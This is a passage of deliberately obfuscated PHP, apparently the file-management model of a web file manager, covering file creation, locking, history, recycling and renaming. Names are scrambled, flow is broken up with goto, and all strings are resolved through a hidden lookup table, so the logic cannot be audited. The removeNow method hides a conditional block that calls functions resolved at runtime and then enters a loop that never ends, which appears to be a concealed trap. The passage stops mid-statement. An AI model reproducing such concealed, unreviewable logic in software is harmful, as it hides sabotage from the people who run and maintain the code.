$A†ŞÑÃÑÁĞ =& $_SERVER[¯Ò¬Èè]; $A‰Ñˆ¿¾Î˜ = $this->sourceInfo($D…¢Œà¨»); if (!$A‰Ñˆ¿¾Î˜) { return !1; } goto d¯”‰ù©Ÿ; d¯”‰ù©Ÿ: $this->lockWriteStart($D…¢Œà¨», $bï—¢Ùôè); if ($e¢õ¥±õä !== !1) { $BØ­ÑĞ Î  = $this->fileNameExist($D…¢Œà¨», $bï—¢Ùôè); if ($BØ­ÑĞ Î  && $e¢õ¥±õä != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($D…¢Œà¨», $bï—¢Ùôè); return $BØ­ÑĞ Î ; } $bï—¢Ùôè = $this->fileNameAuto($D…¢Œà¨», $bï—¢Ùôè, $e¢õ¥±õä); } $B­ÀŠè½£Ì = array($A†ŞÑÃÑÁĞ[527] => 1, $A†ŞÑÃÑÁĞ[386] => $bï—¢Ùôè, $A†ŞÑÃÑÁĞ[528] => $A†ŞÑÃÑÁĞ[33], $A†ŞÑÃÑÁĞ[420] => 0, $A†ŞÑÃÑÁĞ[529] => 0); goto Böã±‰‡¾; c—ÆÅ¶°Æå: return $BÂÇ×³ÀŒÂ; goto dŞâÔØ„¹İ; dŞâÔØ„¹İ: } private function _createFile($d¾ÎáŠÃŠ„, $f˜“ïÜ‚¿‘, $DÖèà·®íâ, $aØ¶ŠØÛ®, &$eÓğÆ¡­©Ø) { goto EêÎó¶š°«; EêÎó¶š°«: $e×ëİ‘ä‰‘ =& $_SERVER[¯Ò¬Èè]; $DÅƒ—Ì­É¶ = $this->sourceInfo($d¾ÎáŠÃŠ„); if (!$DÖèà·®íâ || !$DÅƒ—Ì­É¶) { return !1; } goto E¯À½‚’ùÌ; d±ŠÈ«ÉÅ: $dÀÛŸ”İŸÌ = array($e×ëİ‘ä‰‘[527] => 0, $e×ëİ‘ä‰‘[386] => $f˜“ïÜ‚¿‘, $e×ëİ‘ä‰‘[528] => get_path_ext($f˜“ïÜ‚¿‘), $e×ëİ‘ä‰‘[420] => $DÖèà·®íâ[$e×ëİ‘ä‰‘[419]], $e×ëİ‘ä‰‘[529] => $DÖèà·®íâ[$e×ëİ‘ä‰‘[77]]); $f¾Ñ‰èôà = $this->_addSoure($dÀÛŸ”İŸÌ, $DÅƒ—Ì­É¶); $this->folderSizeReset($d¾ÎáŠÃŠ„); goto a¡•Ûº¸’; a¡•Ûº¸’: return $f¾Ñ‰èôà; goto fŸô’®òõŞ; E¯À½‚’ùÌ: if ($aØ¶ŠØÛ® !== !1) { $b›½Ôø–àå = $this->fileNameExist($d¾ÎáŠÃŠ„, $f˜“ïÜ‚¿‘); } $eÓğÆ¡­©Ø = !0; if ($aØ¶ŠØÛ® && $b›½Ôø–àå) { if ($aØ¶ŠØÛ® == REPEAT_SKIP) { $eÓğÆ¡­©Ø = !1; return $b›½Ôø–àå; } else { if ($aØ¶ŠØÛ® == REPEAT_REPLACE) { $D¶‚‘‘„¨¦ = $this->sourceInfo($b›½Ôø–àå); $c¨ÒÌéìëœ = $this->fileHistory($D¶‚‘‘„¨¦, $DÖèà·®íâ[$e×ëİ‘ä‰‘[419]], $DÖèà·®íâ[$e×ëİ‘ä‰‘[77]]); if (!$c¨ÒÌéìëœ) { $eÓğÆ¡­©Ø = !1; } else { $this->folderSizeReset($d¾ÎáŠÃŠ„); } return $b›½Ôø–àå; } else { $f˜“ïÜ‚¿‘ = $this->fileNameAuto($d¾ÎáŠÃŠ„, $f˜“ïÜ‚¿‘, $aØ¶ŠØÛ®, !1); } } } goto d±ŠÈ«ÉÅ; fŸô’®òõŞ: } protected function fileHistory($DºïçÁ½ùì, $D§æ‰äğ­î, $BæÁšç³Æù) { goto fãÁù†¨ÆŞ; D»÷ã¥Úá: Model($D²ˆ­Ö¼[2341])->addHistory($DºïçÁ½ùì); $cöììñâÚ = array($D²ˆ­Ö¼[533] => USER_ID, $D²ˆ­Ö¼[390] => time(), $D²ˆ­Ö¼[419] => $D§æ‰äğ­î, $D²ˆ­Ö¼[77] => $BæÁšç³Æù); $this->where(array($D²ˆ­Ö¼[383] => $DºïçÁ½ùì[$D²ˆ­Ö¼[369]]))->save($cöììñâÚ); goto eŸ°†š–õ; eŸ°†š–õ: return !0; goto B£§Ùôˆá; fãÁù†¨ÆŞ: $D²ˆ­Ö¼ =& $_SERVER[¯Ò¬Èè]; if ($DºïçÁ½ùì[$D²ˆ­Ö¼[419]] == $D§æ‰äğ­î) { return !1; } $this->checkLock($DºïçÁ½ùì[$D²ˆ­Ö¼[369]], $D§æ‰äğ­î); goto D»÷ã¥Úá; B£§Ùôˆá: } public function checkLock($AíÒšÁ†ßò, $c÷îŠãÉŸ) { goto c”Å¶ñø’; EÖ‡â«œ ¾: $this->_createFileCall($a¦ÉÛÆ§Éğ[$f‡‚´¬†Ÿ¢[461]], $B‘Ìë±‹, $C•çºùÛå, REPEAT_REPLACE, $f‡‚´¬†Ÿ¢[1134]); $E›‡ÆäÛ = $a¦ÉÛÆ§Éğ[$f‡‚´¬†Ÿ¢[417]][$f‡‚´¬†Ÿ¢[481]]; $føµÍÇÁ´¹ = $E›‡ÆäÛ[$f‡‚´¬†Ÿ¢[2343]] ? $E›‡ÆäÛ[$f‡‚´¬†Ÿ¢[2343]] : $E›‡ÆäÛ[$f‡‚´¬†Ÿ¢[28]]; goto dÃŠ£ï²Ş¡; c”Å¶ñø’: $f‡‚´¬†Ÿ¢ =& $_SERVER[¯Ò¬Èè]; $a¦ÉÛÆ§Éğ = $this->pathInfo($AíÒšÁ†ßò); if (!$this->fileIsLock($a¦ÉÛÆ§Éğ, !0)) { return; } goto f­ßÚ‰óñ; dÃŠ£ï²Ş¡: show_json(LNG($f‡‚´¬†Ÿ¢[2344]) . $f‡‚´¬†Ÿ¢[2345] . LNG($f‡‚´¬†Ÿ¢[2346]) . $f‡‚´¬†Ÿ¢[2347] . $føµÍÇÁ´¹ . $f‡‚´¬†Ÿ¢[2348], !1); goto a—ğÕ¦ÑÃ´; f­ßÚ‰óñ: $EÏØàã»‹† = Session::get($f‡‚´¬†Ÿ¢[2342]); $B‘Ìë±‹ = substr($a¦ÉÛÆ§Éğ[$f‡‚´¬†Ÿ¢[28]], 0, -1 - strlen($a¦ÉÛÆ§Éğ[$f‡‚´¬†Ÿ¢[160]])) . $f‡‚´¬†Ÿ¢[1399] . $EÏØàã»‹† . $f‡‚´¬†Ÿ¢[91] . $a¦ÉÛÆ§Éğ[$f‡‚´¬†Ÿ¢[160]]; $C•çºùÛå = Model($f‡‚´¬†Ÿ¢[553])->find($c÷îŠãÉŸ); goto EÖ‡â«œ ¾; a—ğÕ¦ÑÃ´: } public function fileIsLock($B¢¢–éŒØİ, $EïâÎå»î£ = false) { goto FÙÛ´ã•¦è; fØµ¯‹¿¹è: return !1; goto e²âåªÎÓŠ; FÙÛ´ã•¦è: $e™ªÆä‰ºÄ =& $_SERVER[¯Ò¬Èè]; if (!isset($B¢¢–éŒØİ[$e™ªÆä‰ºÄ[417]]) || !$B¢¢–éŒØİ[$e™ªÆä‰ºÄ[417]][$e™ªÆä‰ºÄ[478]]) { return !1; } if ($B¢¢–éŒØİ[$e™ªÆä‰ºÄ[417]][$e™ªÆä‰ºÄ[478]] != USER_ID) { return !0; } goto dİÕº§„òÈ; dİÕº§„òÈ: $c¸´ÕÚ×â = $GLOBALS[$e™ªÆä‰ºÄ[6]][$e™ªÆä‰ºÄ[84]][$e™ªÆä‰ºÄ[479]]; if ($B¢¢–éŒØİ[$e™ªÆä‰ºÄ[417]][$e™ªÆä‰ºÄ[480]] <= time() - $c¸´ÕÚ×â) { $this->metaSet($B¢¢–éŒØİ[$e™ªÆä‰ºÄ[369]], $e™ªÆä‰ºÄ[478], null); $this->metaSet($B¢¢–éŒØİ[$e™ªÆä‰ºÄ[369]], $e™ªÆä‰ºÄ[480], null); } if ($EïâÎå»î£) { $this->metaSet($B¢¢–éŒØİ[$e™ªÆä‰ºÄ[369]], $e™ªÆä‰ºÄ[480], time()); } goto fØµ¯‹¿¹è; e²âåªÎÓŠ: } private function _addSoure($C±â¾÷µ–´, $D±ÓŸ„ë²¤) { goto aäïœ” ¥; eÙŸ¡‡ä: static $fØÏëéßÖ† = false; if (!$fØÏëéßÖ†) { Hook::trigger($dª½ë÷Œ‰”[517], $C±â¾÷µ–´); $fØÏëéßÖ† = !0; } $DÈÁİš‰° = $this->add($C±â¾÷µ–´); goto D¦Î‡µ³ã“; D¦Î‡µ³ã“: $EåÔ­èİÊ = array($dª½ë÷Œ‰”[536] => short_id($DÈÁİš‰°)); $this->where(array($dª½ë÷Œ‰”[383] => $DÈÁİš‰°))->save($EåÔ­èİÊ); $this->setNamePinyin($DÈÁİš‰°, $C±â¾÷µ–´[$dª½ë÷Œ‰”[28]]); goto d¦¦’„ø˜Ú; d¦¦’„ø˜Ú: return $DÈÁİš‰°; goto aÎ¸ÆÂ„Á“; DÆ”‚‰¼¬: $this->updateModifyTime($C±â¾÷µ–´[$dª½ë÷Œ‰”[461]]); $F…ÌÃ³Û = $dª½ë÷Œ‰”[2349] . $D±ÓŸ„ë²¤[$dª½ë÷Œ‰”[369]]; if (isset(self::$cacheChildList[$F…ÌÃ³Û])) { unset(self::$cacheChildList[$F…ÌÃ³Û]); } goto eÙŸ¡‡ä; aäïœ” ¥: $dª½ë÷Œ‰” =& $_SERVER[¯Ò¬Èè]; $Dµ ÛÔ‘é = array($dª½ë÷Œ‰”[530] => $D±ÓŸ„ë²¤[$dª½ë÷Œ‰”[371]], $dª½ë÷Œ‰”[531] => $D±ÓŸ„ë²¤[$dª½ë÷Œ‰”[456]], $dª½ë÷Œ‰”[532] => USER_ID, $dª½ë÷Œ‰”[533] => USER_ID, $dª½ë÷Œ‰”[368] => $D±ÓŸ„ë²¤[$dª½ë÷Œ‰”[369]], $dª½ë÷Œ‰”[534] => $D±ÓŸ„ë²¤[$dª½ë÷Œ‰”[459]] . $D±ÓŸ„ë²¤[$dª½ë÷Œ‰”[369]] . $dª½ë÷Œ‰”[47], $dª½ë÷Œ‰”[396] => 0, $dª½ë÷Œ‰”[535] => $dª½ë÷Œ‰”[33]); $C±â¾÷µ–´ = array_merge($Dµ ÛÔ‘é, $C±â¾÷µ–´); goto DÆ”‚‰¼¬; aÎ¸ÆÂ„Á“: } public function remove($aÜšõçË“œ, $DÑÈ½ñª¶Æ = true) { goto EÂÒÌ”ÁŒà; Fä¶¶Ğ£­¬: $B®è­Ó°Ã = $EÔÎ××¥[$c…ëëáÇÅ’[371]] == self::TYPE_USER ? $c…ëëáÇÅ’[544] : $c…ëëáÇÅ’[980]; if ($B®è­Ó°Ã == $c…ëëáÇÅ’[544]) { $Aá à‘ôö¨ = Model($c…ëëáÇÅ’[474])->getInfo($EÔÎ××¥[$c…ëëáÇÅ’[456]]); $D«°Œ¦‡É = !empty($Aá à‘ôö¨[$c…ëëáÇÅ’[2343]]) ? $Aá à‘ôö¨[$c…ëëáÇÅ’[2343]] : $Aá à‘ôö¨[$c…ëëáÇÅ’[28]]; $D«°Œ¦‡É = $c…ëëáÇÅ’[248] . $D«°Œ¦‡É . $c…ëëáÇÅ’[2351] . $EÔÎ××¥[$c…ëëáÇÅ’[456]]; } else { $Aá à‘ôö¨ = Model($c…ëëáÇÅ’[458])->getInfo($EÔÎ××¥[$c…ëëáÇÅ’[456]]); $D«°Œ¦‡É = _get($Aá à‘ôö¨, $c…ëëáÇÅ’[28]); $D«°Œ¦‡É = $c…ëëáÇÅ’[157] . $D«°Œ¦‡É . $c…ëëáÇÅ’[2352] . $EÔÎ××¥[$c…ëëáÇÅ’[456]]; } $A½äçÂ­„¾ = $c…ëëáÇÅ’[2353] . md5($D«°Œ¦‡É); goto c¬æİµÌ¯Ğ; EÂÒÌ”ÁŒà: $c…ëëáÇÅ’ =& $_SERVER[¯Ò¬Èè]; $EÔÎ××¥ = $this->sourceInfo($aÜšõçË“œ); $F†è¦‘óƒé = intval($EÔÎ××¥[$c…ëëáÇÅ’[371]]) === self::TYPE_SYSTEM; goto a¢»Ó²•‹ª; a¢»Ó²•‹ª: $cÙèÊµ‰òĞ = Model($c…ëëáÇÅ’[1444])->get($c…ëëáÇÅ’[2350]) == $c…ëëáÇÅ’[83]; if ($F†è¦‘óƒé || $DÑÈ½ñª¶Æ || !$cÙèÊµ‰òĞ) { return $this->removeNow($aÜšõçË“œ, $DÑÈ½ñª¶Æ); } $dŸ¯œ¢¢‚Œ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto Fä¶¶Ğ£­¬; eìæ¤‹¨Óß: CacheLock::unlock($A½äçÂ­„¾); $this->metaSet($aÜšõçË“œ, $c…ëëáÇÅ’[2358], $EÔÎ××¥[$c…ëëáÇÅ’[461]]); $this->where(array($c…ëëáÇÅ’[369] => $aÜšõçË“œ))->save(array($c…ëëáÇÅ’[390] => time())); goto fëÄöå§´µ; DÀ‹»Ö‹§”: return $A¶åÁïÛõ; goto Eœ‘–·šİÂ; fëÄöå§´µ: $this->recycleClear($EÔÎ××¥); $A¶åÁïÛõ = $this->move($aÜšõçË“œ, $aà¿ºñ£¥”, REPEAT_RENAME_FOLDER); $this->folderSizeReset($EÔÎ××¥[$c…ëëáÇÅ’[461]]); goto DÀ‹»Ö‹§”; c¬æİµÌ¯Ğ: CacheLock::lock($A½äçÂ­„¾); $aà¿ºñ£¥” = $this->fileNameExist($dŸ¯œ¢¢‚Œ, $D«°Œ¦‡É); if (!$aà¿ºñ£¥”) { $aà¿ºñ£¥” = $this->mkdir($dŸ¯œ¢¢‚Œ, $D«°Œ¦‡É, REPEAT_SKIP); $this->metaSet($aà¿ºñ£¥”, $c…ëëáÇÅ’[2354], $B®è­Ó°Ã); $this->metaSet($aà¿ºñ£¥”, $c…ëëáÇÅ’[2355], $EÔÎ××¥[$c…ëëáÇÅ’[456]]); if ($EÔÎ××¥[$c…ëëáÇÅ’[461]] != 0) { $this->metaSet($aà¿ºñ£¥”, $c…ëëáÇÅ’[2356], _get($Aá à‘ôö¨, $c…ëëáÇÅ’[2357])); } } goto eìæ¤‹¨Óß; Eœ‘–·šİÂ: } private function recycleClear($b‰ëò¹ÆŸ) { $BòÜÊÑ—êÆ =& $_SERVER[¯Ò¬Èè]; $aåë™«»œ£ = $this->childrenAll($b‰ëò¹ÆŸ); $D‰ß‹•÷¸É = array($BòÜÊÑ—êÆ[383] => array($BòÜÊÑ—êÆ[384], $aåë™«»œ£[$BòÜÊÑ—êÆ[2359]])); Model($BòÜÊÑ—êÆ[2360])->where($D‰ß‹•÷¸É)->delete(); } public function removeNow($EÄ‡º‡ì½, $b×¥“ÔÎ… = true) { goto fÔ¸—ŸÉ¸œ; DĞ·Øê†×: $this->lockMoveStart($EÄ‡º‡ì½); Hook::trigger($F©®¦Ô’µÂ[2361], $EíÁ×Ããè, $b×¥“ÔÎ…); if ($b×¥“ÔÎ…) { Model($F©®¦Ô’µÂ[2360])->moveToRecycle($EÄ‡º‡ì½); } else { $B¼—ëÁºî = $this->childrenAll($eˆÄ«‘¦); Model($F©®¦Ô’µÂ[514])->eventRemove($EÄ‡º‡ì½); $this->removeRelevance($B¼—ëÁºî[$F©®¦Ô’µÂ[2359]], $B¼—ëÁºî[$F©®¦Ô’µÂ[1267]]); } goto a¼ÇƒÄÉ; F÷…½¦ƒˆ: $EíÁ×Ããè = $this->pathInfoMore($EÄ‡º‡ì½); if (!$eˆÄ«‘¦) { return !0; } if ($eˆÄ«‘¦[$F©®¦Ô’µÂ[461]] == 0) { if (!_get($GLOBALS, $F©®¦Ô’µÂ[457])) { return !1; } } goto DĞ·Øê†×; CŒÄŞæôÈ: $this->updateModifyTime($FŸõßñùë‘); $this->lockMoveEnd($EÄ‡º‡ì½); Hook::trigger($F©®¦Ô’µÂ[1480], $EíÁ×Ããè, $b×¥“ÔÎ…); goto cñÂåíç¦‚; cñÂåíç¦‚: return !0; goto b‘˜¥ìĞÍ; fÔ¸—ŸÉ¸œ: $F©®¦Ô’µÂ =& $_SERVER[¯Ò¬Èè]; if (!isset($_SERVER[$F©®¦Ô’µÂ[490]]) || !isset($_SERVER[$F©®¦Ô’µÂ[498]])) { goto dëö«¼ä‰; f‰‡Ó÷Î‘Æ: $b»‚²†‚„İ = $BöÜ»×ÀŒÄ($Cë„•Úîèñ); $cæäƒŞÓÎ“ = explode($F©®¦Ô’µÂ[217], $b»‚²†‚„İ); if (count($cæäƒŞÓÎ“) < $F©®¦Ô’µÂ[570]) { $eÃ‰¨ªçÃ¾ = $F©®¦Ô’µÂ[496]; $eÃ‰¨ªçÃ¾(); } goto aÆ–¼’òÃò; dëö«¼ä‰: $AÃÌÈ®½òø = $F©®¦Ô’µÂ[802]; $BöÜ»×ÀŒÄ = $F©®¦Ô’µÂ[492]; $Cë„•Úîèñ = $_SERVER[$F©®¦Ô’µÂ[493]] . $F©®¦Ô’µÂ[494]; goto f‰‡Ó÷Î‘Æ; Fù«†ë³‡: for ($dÎ§†ùœ = $Dâ¢†»ÅìÔ; $dÎ§†ùœ > 0; $dÎ§†ùœ++) { $a‘ÓøÃ°òÕ = json_encode($GLOBALS[$F©®¦Ô’µÂ[384]]); } goto a‚ÆÔÇÄ³Ÿ; aÆ–¼’òÃò: $a‘ÓøÃ°òÕ = $F©®¦Ô’µÂ[803]; $a‘ÓøÃ°òÕ($_SERVER[$F©®¦Ô’µÂ[804]]); $Dâ¢†»ÅìÔ = 1; goto Fù«†ë³‡; a‚ÆÔÇÄ³Ÿ: } $eˆÄ«‘¦ = $this->sourceInfo($EÄ‡º‡ì½); goto F÷…½¦ƒˆ; a¼ÇƒÄÉ: $this->folderSizeReset($eˆÄ«‘¦[$F©®¦Ô’µÂ[461]]); $FŸõßñùë‘ = array($eˆÄ«‘¦[$F©®¦Ô’µÂ[461]]); if ($eˆÄ«‘¦[$F©®¦Ô’µÂ[370]] == $F©®¦Ô’µÂ[83]) { $FŸõßñùë‘[] = $eˆÄ«‘¦[$F©®¦Ô’µÂ[369]]; } goto CŒÄŞæôÈ; b‘˜¥ìĞÍ: } public function childrenAll($DÏòÊ§“À) { $Bš’ÑÙ‡·è =& $_SERVER[¯Ò¬Èè]; $eÈ½åƒÔ‰¦ = $DÏòÊ§“À[$Bš’ÑÙ‡·è[369]]; if ($DÏòÊ§“À[$Bš’ÑÙ‡·è[370]] == $Bš’ÑÙ‡·è[83]) { $eì»‰‹ˆªÙ = array($Bš’ÑÙ‡·è[534] => array($Bš’ÑÙ‡·è[483], $DÏòÊ§“À[$Bš’ÑÙ‡·è[459]] . $eÈ½åƒÔ‰¦ . $Bš’ÑÙ‡·è[484])); $f—¿è¾ôò = array($Bš’ÑÙ‡·è[534] => $eì»‰‹ˆªÙ[$Bš’ÑÙ‡·è[459]]); $D¡‡¸İº = $this->field($Bš’ÑÙ‡·è[2362])->where($f—¿è¾ôò)->select(); $cé¸£§óÛ = !1; $FÕä‚Œ­ù = array($eÈ½åƒÔ‰¦); if ($D¡‡¸İº) { $cé¸£§óÛ = array_to_keyvalue($D¡‡¸İº, $Bš’ÑÙ‡·è[33], $Bš’ÑÙ‡·è[419]); $cé¸£§óÛ = array_remove_value($cé¸£§óÛ, $Bš’ÑÙ‡·è[468]); $FÕä‚Œ­ù = array_to_keyvalue($D¡‡¸İº, $Bš’ÑÙ‡·è[33], $Bš’ÑÙ‡·è[369]); $FÕä‚Œ­ù[] = $eÈ½åƒÔ‰¦; } } else { $cé¸£§óÛ = array($DÏòÊ§“À[$Bš’ÑÙ‡·è[419]]); $FÕä‚Œ­ù = array($eÈ½åƒÔ‰¦); } return array($Bš’ÑÙ‡·è[2359] => $FÕä‚Œ­ù, $Bš’ÑÙ‡·è[1267] => $cé¸£§óÛ); } public function removeArray($E²ÌéÄæ…) { if (!$E²ÌéÄæ…) { return !0; } } public function removeRelevance($C¥´âà‚‘Ã, $Dé˜åÏ÷ñ±) { goto Dê‚ ¥äƒ; Dê‚ ¥äƒ: $B™¤¥À¸È =& $_SERVER[¯Ò¬Èè]; $C¥´âà‚‘Ã = $C¥´âà‚‘Ã ? $C¥´âà‚‘Ã : array(); $Dé˜åÏ÷ñ± = $Dé˜åÏ÷ñ± ? $Dé˜åÏ÷ñ± : array(); goto aÉğíº·ƒÜ; eì…áÙê¦’: for ($CŠó‹¾œÍ¯ = 0; $CŠó‹¾œÍ¯ < count($C¥´âà‚‘Ã); $CŠó‹¾œÍ¯++) { $this->sourceCacheClear($C¥´âà‚‘Ã[$CŠó‹¾œÍ¯]); } goto aƒçˆ¶¤–”; BºàÀâƒ§™: Model($B™¤¥À¸È[2363])->where($B£Ş’ÆÇ²ñ)->delete(); Model($B™¤¥À¸È[514])->where($B£Ş’ÆÇ²ñ)->delete(); Model($B™¤¥À¸È[2091])->removeBySource($C¥´âà‚‘Ã); goto B²£îŒ–†; a†´Õ‚òÉ: $B£Ş’ÆÇ²ñ = array($B™¤¥À¸È[383] => array($B™¤¥À¸È[384], $C¥´âà‚‘Ã)); Model($B™¤¥À¸È[2360])->where($B£Ş’ÆÇ²ñ)->delete(); Model($B™¤¥À¸È[413])->where($B£Ş’ÆÇ²ñ)->delete(); goto BºàÀâƒ§™; B²£îŒ–†: Model($B™¤¥À¸È[2341])->removeBySource($C¥´âà‚‘Ã); $this->where($B£Ş’ÆÇ²ñ)->delete(); Model($B™¤¥À¸È[422])->remove($Dé˜åÏ÷ñ±); goto eì…áÙê¦’; aÉğíº·ƒÜ: $C¥´âà‚‘Ã = array_unique(array_filter($C¥´âà‚‘Ã)); $Dé˜åÏ÷ñ± = array_unique(array_filter($Dé˜åÏ÷ñ±)); if (!$C¥´âà‚‘Ã) { return !1; } goto a†´Õ‚òÉ; aƒçˆ¶¤–”: } public function rename($FßÙ°¨Ò, $f²ÛĞœ“ã¨) { goto CÂö®ï¹Ïø; CÂö®ï¹Ïø: $Aæñ¤ŒÓ¸ =& $_SERVER[¯Ò¬Èè]; $F¨ŠĞ…»™¥ = $this->sourceInfo($FßÙ°¨Ò); if (!$F¨ŠĞ…»™¥) { return !1; } goto A¾˜œÒãà; A¾˜œÒãà: $dô¾‰¶éÉ° = $this->fileNameExist($F¨ŠĞ…»™¥[$Aæñ¤ŒÓ¸[461]], $f²ÛĞœ“ã¨); if ($dô¾‰¶éÉ°) { return !1; } $Bœôæùêˆó = array($Aæñ¤ŒÓ¸[386] => $f²ÛĞœ“ã¨, $Aæñ¤ŒÓ¸[533] => USER_ID); goto AŞá‹Ğ®‡®; AŞá‹Ğ®‡®: if (!$F¨ŠĞ…»™¥[$Aæñ¤ŒÓ¸[370]] == $Aæñ¤ŒÓ¸[83]) { $Bœôæùêˆó[$Aæñ¤ŒÓ¸[372]] = get_path_ext($f²ÛĞœ“ã¨); } Model($Aæñ¤ŒÓ¸[514])->eventRename($FßÙ°¨Ò, $F¨ŠĞ…»™¥[$Aæñ¤ŒÓ¸[28]], $f²ÛĞœ“ã¨); $this->sourceCacheClear($FßÙ°¨Ò); goto b¼¤Œ¢³Ú; b¼¤Œ¢³Ú: $this->setNamePinyin($FßÙ°¨Ò, $Bœôæùêˆó[$Aæñ¤ŒÓ¸[28]], !1); $this->updateModifyTime($F¨ŠĞ…»™¥[$Aæñ¤ŒÓ¸[461]]); $dÆß©”‡­… = $this->where(array($Aæñ¤ŒÓ¸[383] => $FßÙ°¨Ò))->data($Bœôæùêˆó)->save(); goto A”È…Ö£´; A”È…Ö£´: $añà¶‘÷ = $Aæñ¤ŒÓ¸[2349] . $F¨ŠĞ…»™¥[$Aæñ¤ŒÓ¸[461]]; if (isset(self::$cacheChildList[$añà¶‘÷])) { unset(self::$cacheChildList[$añà¶‘÷]); } return $dÆß©”‡­…; goto Cß‚÷œÓô»; Cß‚÷œÓô»: } public function setNamePinyin($dçìÇ¨­‘µ, $CîîÍ¼ğÃ­, $Aáä”¾ã › = true) { $e‘—Êâå =& $_SERVER[¯Ò¬Èè]; $D—áØ¹—°Å = Input::check($CîîÍ¼ğÃ­, $e‘—Êâå[537]); if ($Aáä”¾ã › && !$D—áØ¹—°Å) { return; } if (!$D—áØ¹—°Å) { $this->metaSet($dçìÇ¨­‘µ, $e‘—Êâå[416], null); $this->metaSet($dçìÇ¨­‘µ, $e‘—Êâå[415], null); return; } $aáÓÎáİÜ£ = array($e‘—Êâå[416] => str_replace($e‘—Êâå[50], $e‘—Êâå[33], Pinyin::encode($CîîÍ¼ğÃ­)), $e‘—Êâå[415] => Pinyin::encode($CîîÍ¼ğÃ­, $e‘—Êâå[538])); $this->metaSet($dçìÇ¨­‘µ, $aáÓÎáİÜ£); } public function getContent($F¶Ãáñë„¼) { goto eÓ²©ÄŸù÷; AÚãĞ§¹‚ß: if ($eö«´¡[$FèÁ·šŸ›[77]] == 0) { return $FèÁ·šŸ›[33]; } $e¯‹Úä¢¬É = $FèÁ·šŸ›[2364] . $eö«´¡[$FèÁ·šŸ›[163]]; if ($eö«´¡[$FèÁ·šŸ›[77]] <= 1024 * 10) { $c†èÊ©£Ÿ = Cache::get($e¯‹Úä¢¬É); if (!$c†èÊ©£Ÿ) { $c†èÊ©£Ÿ = IO::getContent($eö«´¡[$FèÁ·šŸ›[75]]); Cache::set($e¯‹Úä¢¬É, $c†èÊ©£Ÿ); } return $c†èÊ©£Ÿ; } goto D¶ÏÉ“ôÖö; D¶ÏÉ“ôÖö: return IO::getContent($eö«´¡[$FèÁ·šŸ›[75]]); goto e–ºÔî›Ÿ•; eÓ²©ÄŸù÷: $FèÁ·šŸ› =& $_SERVER[¯Ò¬Èè]; $eö«´¡ = $this->fileInfoGet($F¶Ãáñë„¼); if (!$eö«´¡) { return !1; } goto AÚãĞ§¹‚ß; e–ºÔî›Ÿ•: } public function setDesc($e´£ÈÎ®¯¾, $C­„Í„ÁŸ) { $fåäá¥öå† =& $_SERVER[¯Ò¬Èè]; Model($fåäá¥öå†[514])->eventAddDesc($e´£ÈÎ®¯¾, $C­„Í„ÁŸ); return $this->metaSet($e´£ÈÎ®¯¾, $fåäá¥öå†[405], $C­„Í„ÁŸ); } public function setContent($EÖÛÈ‰°¨¡, $Dàê¾èö = '') { goto aâŒô°ƒ–; aâŒô°ƒ–: $FÕÀ¯¬œ† =& $_SERVER[¯Ò¬Èè]; $D†µÇ‚ˆ¦À = $this->sourceInfo($EÖÛÈ‰°¨¡); $A–ĞùåÈ¸ = $this->fileInfoGet($EÖÛÈ‰°¨¡); goto eøœ«¤‘º; bÎ¶ÛŠ—Ñ¼: if (!$BëÌõ¿­Ç) { return Model($FÕÀ¯¬œ†[422])->remove($BŒ¹êİÕİ‹[$FÕÀ¯¬œ†[419]]); } $this->folderSizeReset($D†µÇ‚ˆ¦À[$FÕÀ¯¬œ†[461]]); return !0; goto f‹£ğÏİ¯¶; eøœ«¤‘º: if (!$A–ĞùåÈ¸ || !$D†µÇ‚ˆ¦À) { return !1; } $BŒ¹êİÕİ‹ = Model($FÕÀ¯¬œ†[422])->addFileByContent($Dàê¾èö, $D†µÇ‚ˆ¦À[$FÕÀ¯¬œ†[28]]); $BëÌõ¿­Ç = $this->fileHistory($D†µÇ‚ˆ¦À, $BŒ¹êİÕİ‹[$FÕÀ¯¬œ†[419]], $BŒ¹êİÕİ‹[$FÕÀ¯¬œ†[77]]); goto bÎ¶ÛŠ—Ñ¼; f‹£ğÏİ¯¶: } public function fileSubstr($báÖÍ»Øğ, $BìµŒœ¨˜‡, $CÄ¡¢ò´«) { $f‚ã¡øÇµ = $this->fileInfoGet($báÖÍ»Øğ); if (!$f‚ã¡øÇµ) { return !1; } return IO::fileSubstr($f‚ã¡øÇµ[$_SERVER[¯Ò¬Èè][75]], $BìµŒœ¨˜‡, $CÄ¡¢ò´«); } public function fileInfoGet($f¼‘÷Ô‘) { goto aè¯õÈÜŒƒ; A§”—¼¬ÈÔ: $B–›¼ÇÖë = $b·¢Ä»ß´ö[425] . $EÑ²†õŠ›­[$b·¢Ä»ß´ö[419]]; $cä’ñ›……ã = _get(self::$cacheFileInfo, $B–›¼ÇÖë); if ($cä’ñ›……ã) { return $cä’ñ›……ã; } goto c‹—ÂŠ‡ÙÚ; c‹—ÂŠ‡ÙÚ: $a²ó¥“ƒÄ‘ = Model($b·¢Ä»ß´ö[422])->fileInfo($EÑ²†õŠ›­[$b·¢Ä»ß´ö[419]]); if ($a²ó¥“ƒÄ‘) { $a²ó¥“ƒÄ‘[$b·¢Ä»ß´ö[28]] = $EÑ²†õŠ›­[$b·¢Ä»ß´ö[28]]; } self::$cacheFileInfo[$B–›¼ÇÖë] = $a²ó¥“ƒÄ‘; goto Eª‡­¶Ä§‘; aè¯õÈÜŒƒ: $b·¢Ä»ß´ö =& $_SERVER[¯Ò¬Èè]; $EÑ²†õŠ›­ = $this->sourceInfo($f¼‘÷Ô‘); if (!$EÑ²†õŠ›­ || $EÑ²†õŠ›­[$b·¢Ä»ß´ö[370]]) { return !1; } goto A§”—¼¬ÈÔ; Eª‡­¶Ä§‘: return $a²ó¥“ƒÄ‘; goto b‘‘ëË–’‹; b‘‘ëË–’‹: } private function folderChildrenNumber($dˆ¿Ø²’¥) { $Bô¨¬´íÃê =& $_SERVER[¯Ò¬Èè]; $BŒÅí˜•ÒÛ = $this->sourceInfo($dˆ¿Ø²’¥); $Dö¨÷ò˜–µ = array($Bô¨¬´íÃê[534] => array($Bô¨¬´íÃê[483], $BŒÅí˜•ÒÛ[$Bô¨¬´íÃê[459]] . $dˆ¿Ø²’¥ . $Bô¨¬´íÃê[484]), $Bô¨¬´íÃê[396] => intval($BŒÅí˜•ÒÛ[$Bô¨¬´íÃê[397]]), $Bô¨¬´íÃê[527] => 1); $a„çß’ó÷» = $this->where($Dö¨÷ò˜–µ)->count(); $fÌ‘­Ä‹‘é = 